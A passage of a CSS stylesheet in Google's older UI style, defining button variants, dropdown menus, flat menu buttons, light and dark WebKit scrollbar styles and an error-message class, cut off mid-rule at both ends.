  input[type=submit].g-button {
  height: 29px;
  line-height: 29px;
  vertical-align: bottom;
  margin: 0;
  }
  *+html button.g-button,
  *+html input[type=submit].g-button {
  overflow: visible;
  }
  .g-button:hover {
  border: 1px solid #c6c6c6;
  color: #333;
  text-decoration: none;
  -webkit-transition: all 0.0s;
  -moz-transition: all 0.0s;
  -ms-transition: all 0.0s;
  -o-transition: all 0.0s;
  transition: all 0.0s;
  background-color: #f8f8f8;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#f8f8f8),to(#f1f1f1));
  background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -o-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: linear-gradient(top,#f8f8f8,#f1f1f1);
  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  }
  .g-button:active {
  background-color: #f6f6f6;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#f6f6f6),to(#f1f1f1));
  background-image: -webkit-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -o-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: linear-gradient(top,#f6f6f6,#f1f1f1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  .g-button:visited {
  color: #666;
  }
  .g-button-submit {
  border: 1px solid #3079ed;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #4d90fe;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#4d90fe),to(#4787ed));
  background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
  background-image: linear-gradient(top,#4d90fe,#4787ed);
  }
  .g-button-submit:hover {
  border: 1px solid #2f5bb7;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #357ae8;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#4d90fe),to(#357ae8));
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  }
  .g-button-submit:active {
  background-color: #357ae8;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#4d90fe),to(#357ae8));
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  -webkit-box-shadow: inset 0 1px 2px rgb	a(0,0,0,0.3);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .g-button-share {
  border: 1px solid #29691d;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #3d9400;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#3d9400),to(#398a00));
  background-image: -webkit-linear-gradient(top,#3d9400,#398a00);
  background-image: -moz-linear-gradient(top,#3d9400,#398a00);
  background-image: -ms-linear-gradient(top,#3d9400,#398a00);
  background-image: -o-linear-gradient(top,#3d9400,#398a00);
  background-image: linear-gradient(top,#3d9400,#398a00);
  }
  .g-button-share:hover {
  border: 1px solid #2d6200;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #368200;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#3d9400),to(#368200));
  background-image: -webkit-linear-gradient(top,#3d9400,#368200);
  background-image: -moz-linear-gradient(top,#3d9400,#368200);
  background-image: -ms-linear-gradient(top,#3d9400,#368200);
  background-image: -o-linear-gradient(top,#3d9400,#368200);
  background-image: linear-gradient(top,#3d9400,#368200);
  }
  .g-button-share:active {
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .g-button-red {
  border: 1px solid transparent;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  text-transform: uppercase;
  background-color: #d14836;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#dd4b39),to(#d14836));
  background-image: -webkit-linear-gradient(top,#dd4b39,#d14836);
  background-image: -moz-linear-gradient(top,#dd4b39,#d14836);
  background-image: -ms-linear-gradient(top,#dd4b39,#d14836);
  background-image: -o-linear-gradient(top,#dd4b39,#d14836);
  background-image: linear-gradient(top,#dd4b39,#d14836);
  }
  .g-button-red:hover {
  border: 1px solid #b0281a;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #c53727;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#dd4b39),to(#c53727));
  background-image: -webkit-linear-gradient(top,#dd4b39,#c53727);
  background-image: -moz-linear-gradient(top,#dd4b39,#c53727);
  background-image: -ms-linear-gradient(top,#dd4b39,#c53727);
  background-image: -o-linear-gradient(top,#dd4b39,#c53727);
  background-image: linear-gradient(top,#dd4b39,#c53727);
  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.2);
  -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.2);
  -ms-box-shadow: 0 1px 1px rgba(0,0,0,0.2);
  -o-box-shadow: 0 1px 1px rgba(0,0,0,0.2);
  box-shadow: 0 1px 1px rgba(0,0,0,0.2);
  }
  .g-button-red:active {
  border: 1px solid #992a1b;
  background-color: #b0281a;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#dd4b39),to(#b0281a));
  background-image: -webkit-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -moz-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -ms-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -o-linear-gradient(top,#dd4b39,#b0281a);
  background-image: linear-gradient(top,#dd4b39,#b0281a);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  color: #fff
  }
  .g-button-white {
  border: 1px solid #dcdcdc;
  color: #666;
  background: #fff;
  }
  .g-button-white:hover {
  border: 1px solid #c6c6c6;
  color: #333;
  background: #fff;
  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  }
  .g-button-white:active {
  background: #fff;
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  .g-button-red:visited,
  .g-button-share:visited,
  .g-button-submit:visited {
  color: #fff;
  }
  .g-button-submit:focus,
  .g-button-share:focus,
  .g-button-red:focus {
  -webkit-box-shadow: inset 0 0 0 1px #fff;
  -moz-box-shadow: inset 0 0 0 1px #fff;
  box-shadow: inset 0 0 0 1px #fff;
  }
  .g-button-share:focus {
  border-color: #29691d;
  }
  .g-button-red:focus {
  border-color: #d14836;
  }
  .g-button-submit:focus:hover,
  .g-button-share:focus:hover,
  .g-button-red:focus:hover {
  -webkit-box-shadow: inset 0 0 0 1px #fff, 0 1px 1px rgba(0,0,0,0.1);
  -moz-box-shadow: inset 0 0 0 1px #fff, 0 1px 1px rgba(0,0,0,0.1);
  box-shadow: inset 0 0 0 1px #fff, 0 1px 1px rgba(0,0,0,0.1);
  }
  .g-button.selected {
  background-color: #eee;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#eee),to(#e0e0e0));
  background-image: -webkit-linear-gradient(top,#eee,#e0e0e0);
  background-image: -moz-linear-gradient(top,#eee,#e0e0e0);
  background-image: -ms-linear-gradient(top,#eee,#e0e0e0);
  background-image: -o-linear-gradient(top,#eee,#e0e0e0);
  background-image: linear-gradient(top,#eee,#e0e0e0);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  border: 1px solid #ccc;
  color: #333;
  }
  .g-button img {
  display: inline-block;
  margin: -3px 0 0;
  opacity: .55;
  filter: alpha(opacity=55);
  vertical-align: middle;
  pointer-events: none;
  }
  *+html .g-button img {
  margin: 4px 0 0;
  }
  .g-button:hover img {
  opacity: .72;
  filter: alpha(opacity=72);
  }
  .g-button:active img {
  opacity: 1;
  filter: alpha(opacity=100);
  }
  .g-button.disabled img {
  opacity: .5;
  filter: alpha(opacity=50);
  }
  .g-button.disabled,
  .g-button.disabled:hover,
  .g-button.disabled:active,
  .g-button-submit.disabled,
  .g-button-submit.disabled:hover,
  .g-button-submit.disabled:active,
  .g-button-share.disabled,
  .g-button-share.disabled:hover,
  .g-button-share.disabled:active,
  .g-button-red.disabled,
  .g-button-red.disabled:hover,
  .g-button-red.disabled:active,
  input[type=submit][disabled].g-button {
  background-color: none;
  opacity: .5;
  filter: alpha(opacity=50);
  cursor: default;
  pointer-events: none;
  }
  .goog-menu {
  -webkit-box-shadow: 0 2px 4px rgba(0,0,0,0.2);
  -moz-box-shadow: 0 2px 4px rgba(0,0,0,0.2);
  box-shadow: 0 2px 4px rgba(0,0,0,0.2);
  -webkit-transition: opacity 0.218s;
  -moz-transition: opacity 0.218s;
  -ms-transition: opacity 0.218s;
  -o-transition: opacity 0.218s;
  transition: opacity 0.218s;
  background: #fff;
  border: 1px solid #ccc;
  border: 1px solid rgba(0,0,0,.2);
  cursor: default;
  font-size: 13px;
  margin: 0;
  outline: none;
  padding: 0 0 6px;
  position: absolute;
  z-index: 1000;
  overflow: auto;
  }
  .goog-menuitem,
  .goog-tristatemenuitem,
  .goog-filterobsmenuitem {
  position: relative;
  color: #333;
  cursor: pointer;
  list-style: none;
  margin: 0;
  padding: 6px 7em 6px 30px;
  white-space: nowrap;
  }
  .goog-menuitem-highlight,
  .goog-menuitem-hover {
  background-color: #eee;
  border-color: #eee;
  border-style: dotted;
  border-width: 1px 0;
  padding-top: 5px;
  padding-bottom: 5px;
  }
  .goog-menuitem-highlight .goog-menuitem-content,
  .goog-menuitem-hover .goog-menuitem-content {
  color: #333;
  }
  .goog-menuseparator {
  border-top: 1px solid #ebebeb;
  margin-top: 9px;
  margin-bottom: 10px;
  }
  .goog-inline-block {
  position: relative;
  display: -moz-inline-box;
  display: inline-block;
  }
  * html .goog-inline-block {
  display: inline;
  }
  *:first-child+html .goog-inline-block {
  display: inline;
  }
  .dropdown-block {
  display: block;
  }
  .goog-flat-menu-button {
  -webkit-border-radius: 2px;
  -moz-border-radius: 2px;
  border-radius: 2px;
  background-color: #f5f5f5;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#f5f5f5),to(#f1f1f1));
  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
  border: 1px solid #dcdcdc;
  color: #444;
  font-size: 11px;
  font-weight: bold;
  line-height: 27px;
  list-style: none;
  margin: 0 2px;
  min-width: 46px;
  outline: none;
  padding: 0 18px 0 6px;
  text-decoration: none;
  vertical-align: middle;
  }
  .goog-flat-menu-button-disabled {
  background-color: #fff;
  border-color: #f3f3f3;
  color: #b8b8b8;
  cursor: default;
  }
  .goog-flat-menu-button.goog-flat-menu-button-hover {
  background-color: #f8f8f8;
  background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -o-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: linear-gradient(top,#f8f8f8,#f1f1f1);
  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,.1);
  -moz-box-shadow: 0 1px 1px rgba(0,0,0,.1);
  box-shadow: 0 1px 1px rgba(0,0,0,.1);
  border-color: #c6c6c6;
  color: #333;
  }
  .goog-flat-menu-button.goog-flat-menu-button-focused {
  border-color: #4d90fe;
  }
  .form-error .goog-flat-menu-button {
  border: 1px solid #dd4b39;
  }
  .form-error .goog-flat-menu-button-focused {
  border-color: #4d90fe;
  }
  .goog-flat-menu-button.goog-flat-menu-button-open,
  .goog-flat-menu-button.goog-flat-menu-button-active {
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,.1);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,.1);
  background-color: #eee;
  background-image: -webkit-linear-gradient(top,#eee,#e0e0e0);
  background-image: -moz-linear-gradient(top,#eee,#e0e0e0);
  background-image: -ms-linear-gradient(top,#eee,#e0e0e0);
  background-image: -o-linear-gradient(top,#eee,#e0e0e0);
  background-image: linear-gradient(top,#eee,#e0e0e0);
  border: 1px solid #ccc;
  color: #333;
  z-index: 2;
  }
  .goog-flat-menu-button-caption {
  cursor: default;
  vertical-align: top;
  white-space: nowrap;
  }
  .goog-flat-menu-button-dropdown {
  border-color: #777 transparent;
  border-style: solid;
  border-width: 4px 4px 0;
  height: 0;
  width: 0;
  position: absolute;
  right: 5px;
  top: 12px;
  }
  .jfk-select .goog-flat-menu-button-dropdown {
  background: url(http://ssl.gstatic.com/ui/v1/disclosure/grey-disclosure-arrow-up-down.png) center no-repeat;
  border: none;
  height: 11px;
  margin-top: -4px;
  width: 7px;
  }
  .goog-menu-nocheckbox .goog-menuitem,
  .goog-menu-noicon .goog-menuitem {
  padding-left: 16px;
  vertical-align: middle;
  }
  body ::-webkit-scrollbar {
  height: 16px;
  width: 16px;
  overflow: visible;
  }
  body ::-webkit-scrollbar-button {
  height: 0;
  width: 0;
  }
  body ::-webkit-scrollbar-track {
  background-clip: padding-box;
  border: solid transparent;
  border-width: 0 0 0 7px;
  }
  body ::-webkit-scrollbar-track:horizontal {
  border-width: 7px 0 0;
  }
  body ::-webkit-scrollbar-track:hover {
  background-color: rgba(0,0,0,.05);
  -webkit-box-shadow: inset 1px 0 0 rgba(0,0,0,.1);
  box-shadow: inset 1px 0 0 rgba(0,0,0,.1);
  }
  body ::-webkit-scrollbar-track:horizontal:hover {
  -webkit-box-shadow: inset 0 1px 0 rgba(0,0,0,.1);
  box-shadow: inset 0 1px 0 rgba(0,0,0,.1);
  }
  body ::-webkit-scrollbar-track:active {
  background-color: rgba(0,0,0,.05);
  -webkit-box-shadow: inset 1px 0 0 rgba(0,0,0,.14),inset -1px 0 0 rgba(0,0,0,.07);
  box-shadow: inset 1px 0 0 rgba(0,0,0,.14),inset -1px 0 0 rgba(0,0,0,.07);
  }
  body ::-webkit-scrollbar-track:horizontal:active {
  -webkit-box-shadow: inset 0 1px 0 rgba(0,0,0,.14),inset 0 -1px 0 rgba(0,0,0,.07);
  box-shadow: inset 0 1px 0 rgba(0,0,0,.14),inset 0 -1px 0 rgba(0,0,0,.07);
  }
  .jfk-scrollbar-dark::-webkit-scrollbar-track:hover {
  background-color: rgba(255,255,255,.1);
  -webkit-box-shadow: inset 1px 0 0 rgba(255,255,255,.2);
  box-shadow: inset 1px 0 0 rgba(255,255,255,.2);
  }
  .jfk-scrollbar-dark::-webkit-scrollbar-track:horizontal:hover {
  -webkit-box-shadow: inset 0 1px 0 rgba(255,255,255,.2);
  box-shadow: inset 0 1px 0 rgba(255,255,255,.2);
  }
  .jfk-scrollbar-dark::-webkit-scrollbar-track:active {
  background-color: rgba(255,255,255,.1);
  -webkit-box-shadow: inset 1px 0 0 rgba(255,255,255,.25),inset -1px 0 0 rgba(255,255,255,.15);
  box-shadow: inset 1px 0 0 rgba(255,255,255,.25),inset -1px 0 0 rgba(255,255,255,.15);
  }
  .jfk-scrollbar-dark::-webkit-scrollbar-track:horizontal:active {
  -webkit-box-shadow: inset 0 1px 0 rgba(255,255,255,.25),inset 0 -1px 0 rgba(255,255,255,.15);
  box-shadow: inset 0 1px 0 rgba(255,255,255,.25),inset 0 -1px 0 rgba(255,255,255,.15);
  }
  body ::-webkit-scrollbar-thumb {
  background-color: rgba(0,0,0,.2);
  background-clip: padding-box;
  border: solid transparent;
  border-width: 0 0 0 7px;
  min-height: 28px;
  padding: 100px 0 0;
  -webkit-box-shadow: inset 1px 1px 0 rgba(0,0,0,.1),inset 0 -1px 0 rgba(0,0,0,.07);
  box-shadow: inset 1px 1px 0 rgba(0,0,0,.1),inset 0 -1px 0 rgba(0,0,0,.07);
  }
  body ::-webkit-scrollbar-thumb:horizontal {
  border-width: 7px 0 0;
  padding: 0 0 0 100px;
  -webkit-box-shadow: inset 1px 1px 0 rgba(0,0,0,.1),inset -1px 0 0 rgba(0,0,0,.07);
  box-shadow: inset 1px 1px 0 rgba(0,0,0,.1),inset -1px 0 0 rgba(0,0,0,.07);
  }
  body ::-webkit-scrollbar-thumb:hover {
  background-color: rgba(0,0,0,.4);
  -webkit-box-shadow: inset 1px 1px 1px rgba(0,0,0,.25);
  box-shadow: inset 1px 1px 1px rgba(0,0,0,.25);
  }
  body ::-webkit-scrollbar-thumb:active {
  background-color: rgba(0,0,0,.5);
  -webkit-box-shadow: inset 1px 1px 3px rgba(0,0,0,.35);
  box-shadow: inset 1px 1px 3px rgba(0,0,0,.35);
  }
  .jfk-scrollbar-dark::-webkit-scrollbar-thumb {
  background-color: rgba(255,255,255,.3);
  -webkit-box-shadow: inset 1px 1px 0 rgba(255,255,255,.15),inset 0 -1px 0 rgba(255,255,255,.1);
  box-shadow: inset 1px 1px 0 rgba(255,255,255,.15),inset 0 -1px 0 rgba(255,255,255,.1);
  }
  .jfk-scrollbar-dark::-webkit-scrollbar-thumb:horizontal {
  -webkit-box-shadow: inset 1px 1px 0 rgba(255,255,255,.15),inset -1px 0 0 rgba(255,255,255,.1);
  box-shadow: inset 1px 1px 0 rgba(255,255,255,.15),inset -1px 0 0 rgba(255,255,255,.1);
  }
  .jfk-scrollbar-dark::-webkit-scrollbar-thumb:hover {
  background-color: rgba(255,255,255,.6);
  -webkit-box-shadow: inset 1px 1px 1px rgba(255,255,255,.37);
  box-shadow: inset 1px 1px 1px rgba(255,255,255,.37);
  }
  .jfk-scrollbar-dark::-webkit-scrollbar-thumb:active {
  background-color: rgba(255,255,255,.75);
  -webkit-box-shadow: inset 1px 1px 3px rgba(255,255,255,.5);
  box-shadow: inset 1px 1px 3px rgba(255,255,255,.5);
  }
  .jfk-scrollbar-borderless::-webkit-scrollbar-track {
  border-width: 0 1px 0 6px
  }
  .jfk-scrollbar-borderless::-webkit-scrollbar-track:horizontal {
  border-width: 6px 0 1px
  }
  .jfk-scrollbar-borderless::-webkit-scrollbar-track:hover {
  background-color: rgba(0,0,0,.035);
  -webkit-box-shadow: inset 1px 1px 0 rgba(0,0,0,.14),inset -1px -1px 0 rgba(0,0,0,.07);
  box-shadow: inset 1px 1px 0 rgba(0,0,0,.14),inset -1px -1px 0 rgba(0,0,0,.07);
  }
  .jfk-scrollbar-borderless.jfk-scrollbar-dark::-webkit-scrollbar-track:hover {
  background-color: rgba(255,255,255,.07);
  -webkit-box-shadow: inset 1px 1px 0 rgba(255,255,255,.25),inset -1px -1px 0 rgba(255,255,255,.15);
  box-shadow: inset 1px 1px 0 rgba(255,255,255,.25),inset -1px -1px 0 rgba(255,255,255,.15);
  }
  .jfk-scrollbar-borderless::-webkit-scrollbar-thumb {
  border-width: 0 1px 0 6px;
  }
  .jfk-scrollbar-borderless::-webkit-scrollbar-thumb:horizontal {
  border-width: 6px 0 1px;
  }
  body ::-webkit-scrollbar-corner {
  background: transparent;
  }
  body::-webkit-scrollbar-track-piece {
  background-clip: padding-box;
  background-color: #f1f1f1;
  border: solid #fff;
  border-width: 0 0 0 3px;
  -webkit-box-shadow: inset 1px 0 0 rgba(0,0,0,.14),inset -1px 0 0 rgba(0,0,0,.07);
  box-shadow: inset 1px 0 0 rgba(0,0,0,.14),inset -1px 0 0 rgba(0,0,0,.07);
  }
  body::-webkit-scrollbar-track-piece:horizontal {
  border-width: 3px 0 0;
  -webkit-box-shadow: inset 0 1px 0 rgba(0,0,0,.14),inset 0 -1px 0 rgba(0,0,0,.07);
  box-shadow: inset 0 1px 0 rgba(0,0,0,.14),inset 0 -1px 0 rgba(0,0,0,.07);
  }
  body::-webkit-scrollbar-thumb {
  border-width: 1px 1px 1px 5px;
  }
  body::-webkit-scrollbar-thumb:horizontal {
  border-width: 5px 1px 1px;
  }
  body::-webkit-scrollbar-corner {
  background-clip: padding-box;
  background-color: #f1f1f1;
  border: solid #fff;
  border-width: 3px 0 0 3px;
  -webkit-box-shadow: inset 1px 1px 0 rgba(0,0,0,.14);
  box-shadow: inset 1px 1px 0 rgba(0,0,0,.14);
  }
  .jfk-scrollbar::-webkit-scrollbar {
  height: 16px;
  overflow: visible;
  width: 16px;
  }
  .jfk-scrollbar::-webkit-scrollbar-button {
  height: 0;
  width: 0;
  }
  .jfk-scrollbar::-webkit-scrollbar-track {
  background-clip: padding-box;
  border: solid transparent;
  border-width: 0 0 0 7px;
  }
  .jfk-scrollbar::-webkit-scrollbar-track:horizontal {
  border-width: 7px 0 0;
  }
  .jfk-scrollbar::-webkit-scrollbar-track:hover {
  background-color: rgba(0,0,0,.05);
  -webkit-box-shadow: inset 1px 0 0 rgba(0,0,0,.1);
  box-shadow: inset 1px 0 0 rgba(0,0,0,.1);
  }
  .jfk-scrollbar::-webkit-scrollbar-track:horizontal:hover {
  -webkit-box-shadow: inset 0 1px 0 rgba(0,0,0,.1);
  box-shadow: inset 0 1px 0 rgba(0,0,0,.1);
  }
  .jfk-scrollbar::-webkit-scrollbar-track:active {
  background-color: rgba(0,0,0,.05);
  -webkit-box-shadow: inset 1px 0 0 rgba(0,0,0,.14),inset -1px 0 0 rgba(0,0,0,.07);
  box-shadow: inset 1px 0 0 rgba(0,0,0,.14),inset -1px 0 0 rgba(0,0,0,.07);
  }
  .jfk-scrollbar::-webkit-scrollbar-track:horizontal:active {
  -webkit-box-shadow: inset 0 1px 0 rgba(0,0,0,.14),inset 0 -1px 0 rgba(0,0,0,.07);
  box-shadow: inset 0 1px 0 rgba(0,0,0,.14),inset 0 -1px 0 rgba(0,0,0,.07);
  }
  .jfk-scrollbar-dark.jfk-scrollbar::-webkit-scrollbar-track:hover {
  background-color: rgba(255,255,255,.1);
  -webkit-box-shadow: inset 1px 0 0 rgba(255,255,255,.2);
  box-shadow: inset 1px 0 0 rgba(255,255,255,.2);
  }
  .jfk-scrollbar-dark.jfk-scrollbar::-webkit-scrollbar-track:horizontal:hover {
  -webkit-box-shadow: inset 0 1px 0 rgba(255,255,255,.2);
  box-shadow: inset 0 1px 0 rgba(255,255,255,.2);
  }
  .jfk-scrollbar-dark.jfk-scrollbar::-webkit-scrollbar-track:active {
  background-color: rgba(255,255,255,.1);
  -webkit-box-shadow: inset 1px 0 0 rgba(255,255,255,.25),inset -1px 0 0 rgba(255,255,255,.15);
  box-shadow: inset 1px 0 0 rgba(255,255,255,.25),inset -1px 0 0 rgba(255,255,255,.15);
  }
  .jfk-scrollbar-dark.jfk-scrollbar::-webkit-scrollbar-track:horizontal:active {
  -webkit-box-shadow: inset 0 1px 0 rgba(255,255,255,.25),inset 0 -1px 0 rgba(255,255,255,.15);
  box-shadow: inset 0 1px 0 rgba(255,255,255,.25),inset 0 -1px 0 rgba(255,255,255,.15);
  }
  .jfk-scrollbar::-webkit-scrollbar-thumb {
  background-color: rgba(0,0,0,.2);
  background-clip: padding-box;
  border: solid transparent;
  border-width: 0 0 0 7px;
  min-height: 28px;
  padding: 100px 0 0;
  -webkit-box-shadow: inset 1px 1px 0 rgba(0,0,0,.1),inset 0 -1px 0 rgba(0,0,0,.07);
  box-shadow: inset 1px 1px 0 rgba(0,0,0,.1),inset 0 -1px 0 rgba(0,0,0,.07);
  }
  .jfk-scrollbar::-webkit-scrollbar-thumb:horizontal {
  border-width: 7px 0 0;
  padding: 0 0 0 100px;
  -webkit-box-shadow: inset 1px 1px 0 rgba(0,0,0,.1),inset -1px 0 0 rgba(0,0,0,.07);
  box-shadow: inset 1px 1px 0 rgba(0,0,0,.1),inset -1px 0 0 rgba(0,0,0,.07);
  }
  .jfk-scrollbar::-webkit-scrollbar-thumb:hover {
  background-color: rgba(0,0,0,.4);
  -webkit-box-shadow: inset 1px 1px 1px rgba(0,0,0,.25);
  box-shadow: inset 1px 1px 1px rgba(0,0,0,.25);
  }
  .jfk-scrollbar::-webkit-scrollbar-thumb:active {
  background-color: rgba(0,0,0,0.5);
  -webkit-box-shadow: inset 1px 1px 3px rgba(0,0,0,0.35);
  box-shadow: inset 1px 1px 3px rgba(0,0,0,0.35);
  }
  .jfk-scrollbar-dark.jfk-scrollbar::-webkit-scrollbar-thumb {
  background-color: rgba(255,255,255,.3);
  -webkit-box-shadow: inset 1px 1px 0 rgba(255,255,255,.15),inset 0 -1px 0 rgba(255,255,255,.1);
  box-shadow: inset 1px 1px 0 rgba(255,255,255,.15),inset 0 -1px 0 rgba(255,255,255,.1);
  }
  .jfk-scrollbar-dark.jfk-scrollbar::-webkit-scrollbar-thumb:horizontal {
  -webkit-box-shadow: inset 1px 1px 0 rgba(255,255,255,.15),inset -1px 0 0 rgba(255,255,255,.1);
  box-shadow: inset 1px 1px 0 rgba(255,255,255,.15),inset -1px 0 0 rgba(255,255,255,.1);
  }
  .jfk-scrollbar-dark.jfk-scrollbar::-webkit-scrollbar-thumb:hover {
  background-color: rgba(255,255,255,.6);
  -webkit-box-shadow: inset 1px 1px 1px rgba(255,255,255,.37);
  box-shadow: inset 1px 1px 1px rgba(255,255,255,.37);
  }
  .jfk-scrollbar-dark.jfk-scrollbar::-webkit-scrollbar-thumb:active {
  background-color: rgba(255,255,255,.75);
  -webkit-box-shadow: inset 1px 1px 3px rgba(255,255,255,.5);
  box-shadow: inset 1px 1px 3px rgba(255,255,255,.5);
  }
  .jfk-scrollbar-borderless.jfk-scrollbar::-webkit-scrollbar-track {
  border-width: 0 1px 0 6px;
  }
  .jfk-scrollbar-borderless.jfk-scrollbar::-webkit-scrollbar-track:horizontal {
  border-width: 6px 0 1px;
  }
  .jfk-scrollbar-borderless.jfk-scrollbar::-webkit-scrollbar-track:hover {
  background-color: rgba(0,0,0,.035);
  -webkit-box-shadow: inset 1px 1px 0 rgba(0,0,0,.14),inset -1px -1px 0 rgba(0,0,0,.07);
  box-shadow: inset 1px 1px 0 rgba(0,0,0,.14),inset -1px -1px 0 rgba(0,0,0,.07);
  }
  .jfk-scrollbar-borderless.jfk-scrollbar-dark.jfk-scrollbar::-webkit-scrollbar-track:hover {
  background-color: rgba(255,255,255,.07);
  -webkit-box-shadow: inset 1px 1px 0 rgba(255,255,255,.25),inset -1px -1px 0 rgba(255,255,255,.15);
  box-shadow: inset 1px 1px 0 rgba(255,255,255,.25),inset -1px -1px 0 rgba(255,255,255,.15);
  }
  .jfk-scrollbar-borderless.jfk-scrollbar::-webkit-scrollbar-thumb {
  border-width: 0 1px 0 6px;
  }
  .jfk-scrollbar-borderless.jfk-scrollbar::-webkit-scrollbar-thumb:horizontal {
  border-width: 6px 0 1px;
  }
  .jfk-scrollbar::-webkit-scrollbar-corner {
  background: transparent;
  }
  body.jfk-scrollbar::-webkit-scrollbar-track-piece {
  background-clip: padding-box;
  background-color: #f1f1f1;
  border: solid #fff;
  border-width: 0 0 0 3px;
  -webkit-box-shadow: inset 1px 0 0 rgba(0,0,0,.14),inset -1px 0 0 rgba(0,0,0,.07);
  box-shadow: inset 1px 0 0 rgba(0,0,0,.14),inset -1px 0 0 rgba(0,0,0,.07);
  }
  body.jfk-scrollbar::-webkit-scrollbar-track-piece:horizontal {
  border-width: 3px 0 0;
  -webkit-box-shadow: inset 0 1px 0 rgba(0,0,0,.14),inset 0 -1px 0 rgba(0,0,0,.07);
  box-shadow: inset 0 1px 0 rgba(0,0,0,.14),inset 0 -1px 0 rgba(0,0,0,.07);
  }
  body.jfk-scrollbar::-webkit-scrollbar-thumb {
  border-width: 1px 1px 1px 5px;
  }
  body.jfk-scrollbar::-webkit-scrollbar-thumb:horizontal {
  border-width: 5px 1px 1px;
  }
  body.jfk-scrollbar::-webkit-scrollbar-corner {
  background-clip: padding-box;
  background-color: #f1f1f1;
  border: solid #fff;
  border-width: 3px 0 0 3px;
  -webkit-box-shadow: inset 1px 1px 0 rgba(0,0,0,.14);
  box-shadow: inset 1px 1px 0 rgba(0,0,0,.14);
  }
  .errormsg {
  margin: .5em 0 0;
  display: block;
  color: #dd4b39;
  line-height: 17px;
  }
  .help-link {
  background: #dd4b39;
  padding: 0 5px;
  color: #fff;
  font-weight: bold;
  display: inline-block;
